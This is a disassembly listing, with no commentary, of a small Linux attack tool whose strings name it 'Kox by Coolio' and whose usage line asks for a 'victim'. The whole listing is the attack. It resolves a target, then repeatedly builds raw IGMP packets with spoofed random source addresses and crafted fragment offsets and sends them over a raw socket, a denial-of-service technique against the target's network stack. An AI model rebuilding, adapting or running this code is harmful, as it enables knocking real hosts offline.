xor ebp, ebp
test edx, edx
je 0x8048889
push edx
call sym.imp.atexit
pop eax
call sym.imp.__libc_init_first
pop esi
lea eax, [esp + esi*4 + 4]
mov dword [obj._environ], eax
mov edx, esp
and esp, 0xfffffff8
push eax
push eax
push edx
push esi
call sym._init
push sym._fini
call sym.imp.atexit
pop eax
call main
push eax
call sym.imp.exit
jmp dword [reloc.atexit]
jmp dword [reloc.__libc_init_first]
push ebp
mov ebp, esp
push ebx
call 0x80486c9
pop ebx
add ebx, 0x1847
cmp dword [ebx + 0x6c], 0
je 0x80486de
call loc.imp.__gmon_start__
mov esi, esi
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.force_to_data
cmp dword [obj.force_to_data], 0xffffffff
je 0x8048e60
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x8048e54
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
push 0
call sym.imp.time
add esp, 4
mov eax, eax
push eax
call sym.imp.srandom
add esp, 4
cmp dword [argv], 1
jg 0x8048d57
mov eax, dword [envp]
mov edx, dword [eax]
push edx
call loc.gcc2_compiled._3
add esp, 4
mov eax, dword [envp]
add eax, 4
mov edx, dword [eax]
push edx
call sym.imp.gethostbyname
add esp, 4
mov eax, eax
mov dword [var_14h], eax
cmp dword [var_14h], 0
jne 0x8048d90
mov eax, dword [envp]
add eax, 4
mov edx, dword [eax]
push edx
call sym.imp.herror
add esp, 4
push 1
call sym.imp.exit
add esp, 4
mov esi, esi
mov eax, dword [var_14h]
mov edx, dword [eax + 0xc]
push edx
mov eax, dword [var_14h]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
push eax
lea eax, [var_10h]
lea edx, [eax + 4]
push edx
call sym.imp.memcpy
add esp, 0xc
push 0
call sym.imp.htons
add esp, 4
mov eax, eax
mov word [var_eh], ax
mov word [var_10h], 2
push str.IGMP__
call sym.imp.printf
add esp, 4
push obj._IO_stdout_
call sym.imp.fflush
add esp, 4
mov dword [var_18h], 0
cmp dword [var_18h], 9
jle 0x8048df0
jmp 0x8048e24
mov esi, esi
call sym.randip
mov eax, eax
push eax
lea eax, [var_10h]
push eax
call sym.nuke_igmp
add esp, 8
push 0x8048ef5
call sym.imp.printf
add esp, 4
push obj._IO_stdout_
call sym.imp.fflush
add esp, 4
inc dword [var_18h]
jmp 0x8048de6
nop
push 0x8048ef7
call sym.imp.printf
add esp, 4
push obj._IO_stdout_
call sym.imp.fflush
add esp, 4
leave
ret
jmp dword [reloc.exit]
push ebp
mov ebp, esp
push ebx
call 0x8048e79
pop ebx
add ebx, 0x1097
call loc.gcc2_compiled.
mov ebx, dword [var_4h]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__DTOR_END__
cmp dword [obj.__DTOR_END__], 0
je 0x80488e0
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 4
cmp dword [ebx], 0
jne 0x80488d4
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
sub esp, 0x28
push ebx
mov dword [size], 0x5dc
call sym.imp.random
mov ecx, eax
mov eax, ecx
mov ebx, 0x9c40
cdq
idiv ebx
mov dword [var_28h], edx
mov edx, dword [var_28h]
add edx, 0x1f4
mov dword [var_24h], edx
mov eax, dword [size]
push eax
push 1
call sym.imp.calloc
add esp, 8
mov dword [ptr], eax
mov eax, dword [ptr]
mov dword [var_ch], eax
mov ebx, dword [ptr]
add ebx, 0x14
mov dword [var_10h], ebx
mov eax, dword [var_ch]
and byte [eax], 0xf
or byte [eax], 0x40
mov eax, dword [var_ch]
and byte [eax], 0xf0
or byte [eax], 5
mov eax, dword [var_ch]
mov byte [eax + 8], 0xff
movzx eax, word [size]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [var_ch]
mov dword [var_28h], edx
mov ebx, dword [var_28h]
mov word [ebx + 2], ax
mov eax, dword [var_ch]
mov byte [eax + 9], 2
movzx eax, word [var_24h]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [var_ch]
mov dword [var_28h], edx
mov ebx, dword [var_28h]
mov word [ebx + 4], ax
push 0x2000
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [var_ch]
mov dword [var_28h], edx
mov ebx, dword [var_28h]
mov word [ebx + 6], ax
mov eax, dword [var_ch]
mov edx, dword [arg_ch]
mov dword [var_28h], edx
mov ebx, dword [var_28h]
mov dword [eax + 0xc], ebx
mov eax, dword [var_ch]
mov edx, dword [arg_8h]
mov dword [var_28h], edx
mov ebx, dword [var_28h]
mov ecx, dword [ebx + 4]
mov dword [eax + 0x10], ecx
push 0x14
mov eax, dword [var_ch]
push eax
call sym.in_cksum
add esp, 8
mov eax, eax
mov edx, dword [var_ch]
mov dword [var_28h], edx
mov ebx, dword [var_28h]
mov word [ebx + 0xa], ax
mov eax, dword [var_10h]
mov byte [eax], 0
mov eax, dword [var_10h]
mov dword [eax + 4], 0
push 8
mov eax, dword [var_10h]
push eax
call sym.in_cksum
add esp, 8
mov eax, eax
mov edx, dword [var_10h]
mov dword [var_28h], edx
mov ebx, dword [var_28h]
mov word [ebx + 2], ax
mov dword [var_1ch], 0x1d
mov eax, dword [var_1ch]
cmp dword [size], eax
jg 0x8048b60
jmp 0x8048b84
mov esi, esi
call sym.imp.random
mov eax, eax
mov edx, dword [ptr]
add edx, dword [var_1ch]
mov dword [var_28h], edx
mov ebx, 0xff
cdq
idiv ebx
mov ecx, edx
mov edx, dword [var_28h]
mov byte [edx], cl
inc dword [var_1ch]
jmp 0x8048b54
mov ebx, dword [ptr]
add ebx, 0x44
mov dword [var_14h], ebx
mov eax, dword [var_14h]
push eax
call sym.imp.uname
add esp, 4
mov edx, dword [var_14h]
add edx, 0x190
mov dword [s1], edx
push 0x1c
call sym.imp.getuid
mov eax, eax
push eax
call sym.imp.getpwuid
add esp, 4
mov eax, eax
push eax
mov eax, dword [s1]
push eax
call sym.imp.memcpy
add esp, 0xc
push 0xff
push 3
push 2
call sym.imp.socket
add esp, 0xc
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0
jge 0x8048bfc
push str.error:_socket__
call sym.imp.perror
add esp, 4
mov eax, 1
jmp 0x8048d20
lea esi, [esi]
push 0x10
mov eax, dword [arg_8h]
push eax
push 0
mov eax, dword [size]
push eax
mov eax, dword [ptr]
push eax
mov eax, dword [fildes]
push eax
call sym.imp.sendto
add esp, 0x18
mov eax, eax
cmp eax, 0xffffffff
jne 0x8048c38
push str.error:_sendto__
call sym.imp.perror
add esp, 4
mov eax, 1
jmp 0x8048d20
mov esi, esi
push 0xf4240
call sym.imp.usleep
add esp, 4
mov dword [var_1ch], 1
cmp dword [var_1ch], 4
jle 0x8048c58
jmp 0x8048d04
nop
cmp dword [var_1ch], 3
jle 0x8048c98
mov eax, dword [size]
add eax, 0xffffffec
mov ebx, eax
imul ebx, dword [var_1ch]
mov dword [var_28h], ebx
mov eax, dword [var_28h]
sar eax, 3
movzx edx, ax
mov dword [var_28h], edx
push dword [var_28h]
call sym.imp.htons
add esp, 4
mov eax, eax
mov ebx, dword [var_ch]
mov dword [var_28h], ebx
mov edx, dword [var_28h]
mov word [edx + 6], ax
jmp 0x8048cd2
lea esi, [esi]
mov eax, dword [size]
add eax, 0xffffffec
mov ebx, eax
imul ebx, dword [var_1ch]
mov dword [var_28h], ebx
mov eax, dword [var_28h]
sar eax, 3
mov edx, eax
or dh, 0x20
mov word [var_28h], dx
movzx eax, word [var_28h]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov ebx, dword [var_ch]
mov dword [var_28h], ebx
mov edx, dword [var_28h]
mov word [edx + 6], ax
push 0x10
mov eax, dword [arg_8h]
push eax
push 0
mov eax, dword [size]
push eax
mov eax, dword [ptr]
push eax
mov eax, dword [fildes]
push eax
call sym.imp.sendto
add esp, 0x18
push 0x1e8480
call sym.imp.usleep
add esp, 4
inc dword [var_1ch]
jmp 0x8048c4c
nop
mov eax, dword [ptr]
push eax
call sym.imp.free
add esp, 4
mov eax, dword [fildes]
push eax
call sym.imp.close
add esp, 4
xor eax, eax
jmp 0x8048d20
mov ebx, dword [var_2ch]
leave
ret
push ebp
mov ebp, esp
push str.Kox_by_Coolio__coolio_k_r4d.com__n
call sym.imp.printf
add esp, 4
mov eax, dword [arg_8h]
push eax
push str.Usage:__s__victim__n
call sym.imp.printf
add esp, 8
push 1
call sym.imp.exit
jmp dword [reloc.printf]
push ebp
mov ebp, esp
sub esp, 0x18
push ebx
push 0x10
push 1
call sym.imp.calloc
add esp, 8
mov dword [cp], eax
call sym.imp.random
mov ecx, eax
mov eax, ecx
mov ebx, 0xfd
cdq
idiv ebx
lea ecx, [edx + 1]
push ecx
call sym.imp.random
mov ecx, eax
mov eax, ecx
mov ebx, 0xfd
cdq
idiv ebx
lea ecx, [edx + 1]
push ecx
call sym.imp.random
mov ecx, eax
mov eax, ecx
mov ebx, 0xfd
cdq
idiv ebx
lea ecx, [edx + 1]
push ecx
call sym.imp.random
mov ecx, eax
mov eax, ecx
mov ebx, 0xbf
cdq
idiv ebx
lea ecx, [edx + 0x17]
push ecx
push str._d._d._d._d
mov eax, dword [cp]
push eax
call sym.imp.sprintf
add esp, 0x18
lea eax, [pin]
push eax
mov eax, dword [cp]
push eax
call sym.imp.inet_aton
add esp, 8
mov eax, dword [var_10h]
jmp 0x80489b0
mov ebx, dword [var_1ch]
leave
ret
jmp dword [reloc.calloc]
jmp dword [reloc.random]
jmp dword [reloc.sprintf]
jmp dword [reloc.inet_aton]
push ebp
mov ebp, esp
sub esp, 4
push ebx
xor edx, edx
cmp dword [arg_ch], 1
jg 0x80489cc
jmp 0x80489e0
lea esi, [esi]
mov eax, dword [arg_8h]
movzx ebx, word [eax]
add edx, ebx
add dword [arg_8h], 2
add dword [arg_ch], 0xfffffffe
jmp 0x80489c1
mov esi, esi
cmp dword [arg_ch], 1
jne 0x80489fa
mov word [var_2h], 0
mov eax, dword [arg_8h]
mov bl, byte [eax]
mov byte [var_2h], bl
movzx eax, word [var_2h]
add edx, eax
mov eax, edx
sar eax, 0x10
movzx ebx, dx
lea edx, [ebx + eax]
mov eax, edx
sar eax, 0x10
add edx, eax
mov ecx, edx
not cx
movzx ebx, cx
mov eax, ebx
jmp 0x8048a18
mov ebx, dword [var_8h]
leave
ret
jmp dword [reloc.fflush]
jmp dword [reloc.memcpy]
jmp dword [reloc.free]
jmp dword [reloc.srandom]
jmp dword [reloc.perror]
jmp dword [reloc.time]
jmp dword [reloc.getpwuid]
jmp dword [reloc.uname]
jmp dword [reloc.getuid]
jmp dword [reloc.close]
jmp dword [reloc.htons]
jmp dword [reloc.usleep]
jmp dword [reloc.socket]
jmp dword [reloc.sendto]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.herror]
